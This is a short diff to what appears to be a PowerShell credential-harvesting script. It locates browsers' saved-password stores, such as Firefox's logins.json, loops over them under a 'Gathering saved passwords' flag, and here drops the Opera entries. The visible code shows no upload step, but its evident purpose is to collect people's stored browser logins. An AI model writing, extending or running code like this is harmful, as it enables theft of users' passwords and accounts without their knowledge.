@@ -137,7 +137,6 @@ if ($executeExe) {
 
 <# Browser Saved Passwords #>
 $FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
-$OperaCredsLocation = get-childitem -path "$env:appdata\Opera Software\Opera Stable\"
 if ($gatherBrowserPass) {
     Write-Output "[ + ] Gathering saved passwords"
     $browserData = @(
@@ -165,11 +164,6 @@ if ($gatherBrowserPass) {
             LocalStatePath = "$FirefoxCredsLocation\logins.json"
             Prefix = "Firefox"
         },
-        @{
-            ProcessName = "Opera"
-            LoginDataPath = "$OperaCredsLocation\Login Data"
-            Prefix = "Opera"
-        }
     )
 
     foreach ($browser in $browserData) {
